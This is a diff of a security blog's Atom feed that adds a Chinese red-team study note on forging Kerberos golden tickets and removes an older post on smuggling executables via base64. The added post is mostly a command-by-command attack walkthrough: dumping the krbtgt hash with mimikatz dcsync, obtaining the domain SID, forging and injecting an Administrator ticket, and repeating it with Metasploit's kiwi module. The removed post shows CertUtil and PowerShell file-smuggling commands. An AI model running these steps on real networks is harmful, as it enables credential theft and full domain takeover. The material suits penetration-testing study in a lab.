@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-09-24T02:20:57.661Z</updated>
+  <updated>2021-09-27T08:41:23.535Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】28、黄金票据</title>
+    <link href="https://www.teamssix.com/210927-163036.html"/>
+    <id>https://www.teamssix.com/210927-163036.html</id>
+    <published>2021-09-27T08:30:36.000Z</published>
+    <updated>2021-09-27T08:41:23.535Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p><ul><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li><li>krbtgt 的 NTLM Hash 或 AES-256 值</li></ul><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p><p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p><h2 id="1、导出-krbtgt-的-NTLM-Hash"><a href="#1、导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1、导出 krbtgt 的 NTLM Hash"></a>1、导出 krbtgt 的 NTLM Hash</h2><p>在 mimikatz 下执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p><p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。</p><p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2、获取基本信息"><a href="#2、获取基本信息" class="headerlink" title="2、获取基本信息"></a>2、获取基本信息</h2><p>获取域 SID</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p><p>获取当前用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域名</p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、制作黄金票据"><a href="#3、制作黄金票据" class="headerlink" title="3、制作黄金票据"></a>3、制作黄金票据</h2><p>先将票据清空</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传递票据并注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271559013.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p><h2 id="5、MSF-下的利用"><a href="#5、MSF-下的利用" class="headerlink" title="5、MSF 下的利用"></a>5、MSF 下的利用</h2><p>首先上线一个普通用户，然后加载 kiwi 模块</p><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将黄金票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271628454.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a></p><p>原文链接：</p><p><a href="https://teamssix.com/210927-163036.html">https://teamssix.com/210927-163036.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】27、Kerberos 域用户提权漏洞</title>
@@ -534,34 +564,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
-    <link href="https://www.teamssix.com/210701-161347.html"/>
-    <id>https://www.teamssix.com/210701-161347.html</id>
-    <published>2021-07-01T08:13:47.000Z</published>
-    <updated>2021-08-04T08:22:03.548Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre class="line-numbers language-none"><code class="language-none">$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 PowerShell 进行 base64 解码</p><pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 CertUtil 进行解码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"> </p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a></p><p><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;1、前言&quot;&gt;&lt;a href=&quot;#1、前言&quot; class=&quot;headerlink&quot; title=&quot;1、前言&quot;&gt;&lt;/a&gt;1、前言&lt;/h2&gt;&lt;p&gt;有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe </summary>
       
     
     
